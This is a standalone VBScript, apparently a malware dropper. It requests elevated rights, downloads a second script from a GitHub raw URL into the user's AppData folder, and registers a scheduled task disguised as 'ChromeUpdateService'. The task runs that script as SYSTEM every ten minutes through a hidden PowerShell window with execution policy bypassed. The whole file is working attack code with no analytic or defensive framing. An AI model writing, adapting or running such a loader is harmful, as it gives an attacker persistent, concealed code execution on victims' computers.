If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject("Shell.Application")
   objShell.ShellExecute "wscript.exe", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
Else
   Dim i, objFile, objFSO, objHTTP, strFile
   Set WshShell = CreateObject("WScript.Shell")
   Home = WshShell.ExpandEnvironmentStrings("%appdata%")
   file = Home & "\directRun.vbs"
   myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/directRun.vbs"
   myPath = file
   Const ForReading = 1, ForWriting = 2, ForAppending = 8
   Set objFSO = CreateObject( "Scripting.FileSystemObject" )
   If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
   ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
   End If
   Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
   Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
   objHTTP.Open "GET", myURL, False
   objHTTP.Send
   For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
   Next
   objFile.Close()
   Set WshShell = CreateObject("WScript.Shell")
   cmd="schtasks /create /sc minute /mo 10 /tn ""ChromeUpdateService"" /ru ""SYSTEM"" /tr ""powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe " & file & "'"" /f"
   WshShell.Run cmd, 0, True
   Set WshShell = Nothing
End If
